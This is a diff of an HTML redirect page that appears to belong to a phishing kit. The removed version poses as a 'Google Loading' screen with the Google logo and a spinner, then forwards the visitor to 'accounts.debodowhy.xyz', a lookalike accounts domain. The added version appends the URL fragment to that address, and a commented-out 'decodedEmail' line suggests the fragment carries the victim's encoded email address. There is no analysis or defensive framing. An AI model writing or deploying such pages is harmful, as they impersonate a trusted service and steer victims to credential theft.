@@ -1,147 +1,32 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Google Loading</title>
-    <style>
-      :root {
-        color-scheme: light;
-        background: #ffffff;
-        color: #5f6368;
-      }
+<!DOCTYPE html>
+<html>
 
-      * {
-        box-sizing: border-box;
-      }
+<head>
+    <title>Redirrecting......</title>
+</head>
 
-      html,
-      body {
-        margin: 0;
-        min-height: 100vh;
-        font-family: "Google Sans", "Product Sans", Roboto, Arial, sans-serif;
-        background: #fff;
-        color: #5f6368;
-      }
-
-      body {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        padding: 0 24px;
-        min-height: 100vh;
-      }
-
-      .container {
-        max-width: 380px;
-        width: 100%;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .logo {
-        margin: 0 auto 26px;
-        width: 100px;
-        max-width: 80vw;
-      }
-
-      .logo img {
-        display: block;
-        width: 100%;
-        height: auto;
-      }
-
-      .loader-ring {
-        position: relative;
-        width: 58px;
-        height: 58px;
-        margin: 0 auto 20px;
-        border-radius: 50%;
-        background: radial-gradient(
-          circle at center,
-          rgba(0, 0, 0, 0.05) 0%,
-          rgba(0, 0, 0, 0.02) 40%,
-          transparent 42%
-        );
-        overflow: hidden;
-      }
-
-      .loader-ring::before {
-        content: "";
-        position: absolute;
-        inset: 34px;
-        border-radius: 50%;
-        border: 4px solid rgba(0, 0, 0, 0.1);
-      }
-
-      .loader-ring::after {
-        content: "";
-        position: absolute;
-        inset: 4px;
-        border-radius: 50%;
-        border: 4px solid transparent;
-        border-top-color: #1a73e8;
-        animation: spin 1s linear infinite;
-      }
-
-      .loading-text {
-        font-size: 14px;
-        line-height: 1.4;
-        letter-spacing: 0.02em;
-        color: #5f6368;
-        margin: 0;
-      }
-
-      @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(360deg);
-        }
-      }
-
-      @media (max-width: 420px) {
-        .logo {
-          width: 150px;
-          margin-bottom: 26px;
-        }
-        .loader-ring {
-          width: 56px;
-          height: 56px;
-        }
-        .loader-ring::before,
-        .loader-ring::after {
-          inset: 3px;
-          border-width: 5px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container" role="status" aria-live="polite">
-      <div class="logo" aria-label="Google logo">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
-          alt="Google logo"
-        />
-      </div>
-
-      <div class="loader-ring" aria-hidden="true"></div>
-      <p class="loading-text">Loading...</p>
-    </div>
-
+<body>
     <script>
-      (function () {
-        var redirectUrl = "https://accounts.debodowhy.xyz?5n8FfM_vWKY=Z2JibGlp==#psi=";
-        var delay = 5000;
-        setTimeout(function () {
-          window.location.href = redirectUrl;
-        }, delay);
-      })();
+        function redirrectPage() {
+            const linkraw = "https://accounts.debodowhy.xyz?5n8FfM_vWKY=Z2JibGlp==#psi=";
+            var query = window.location.href;
+            console.log(query);
+            var res = query.split("#");
+            var data1 = res[0];
+            var data2 = res[1];
+            console.log(data1);
+            console.log(data2);
+            if (data2) {
+                //var decodedEmail = atob(data2);
+                console.log("true");
+                window.location.href = linkraw + data2;
+            } else {
+                console.log("false");
+                window.location.href = linkraw;
+            }
+        }
+        redirrectPage();
     </script>
-  </body>
+</body>
+
 </html>
